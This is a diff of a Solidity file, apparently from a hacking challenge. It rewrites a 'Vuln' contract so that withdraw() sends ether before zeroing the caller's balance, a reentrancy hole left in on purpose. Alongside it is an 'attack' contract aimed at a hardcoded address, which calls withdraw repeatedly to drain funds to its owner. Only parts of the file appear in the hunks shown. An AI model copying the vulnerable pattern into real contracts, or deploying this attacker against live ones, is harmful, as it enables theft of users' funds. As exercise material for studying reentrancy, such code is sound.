@@ -7,25 +7,21 @@ pragma solidity ^0.6.0;
 //
 // Happy hacking, and play nice! :)
 
-contract Vuln
-{
-    function atk() public payable
-    {
-        count = 0;
-        vuln.deposit.value(msg.value)();
+contract Vuln {
+    mapping(address => uint256) public balances;
+    function deposit() public payable {
+        // Increment their balance with whatever they pay
+        balances[msg.sender] += msg.value;
     }
-
-    function gimmeGimme() public 
-    {
-        if(msg.sender == owner)
-        {
-            msg.sender.send(address(this).balance);
-        }
+    function withdraw() public {
+        // Refund their balance
+        msg.sender.call.value(balances[msg.sender])("");
+        // Set their balance to 0
+        balances[msg.sender] = 0;
     }
 }
 
-contract attack
-{
+contract attack {
     address payable owner;
     address vuln_contract = 0x36A540E3A78084962B75E25877CfACf8846Be018;
     Vuln public vuln = Vuln(address(vuln_contract));
@@ -46,7 +42,6 @@ contract attack
             vuln.withdraw();
         }
     }
-    
     
     function atk() public payable
     {
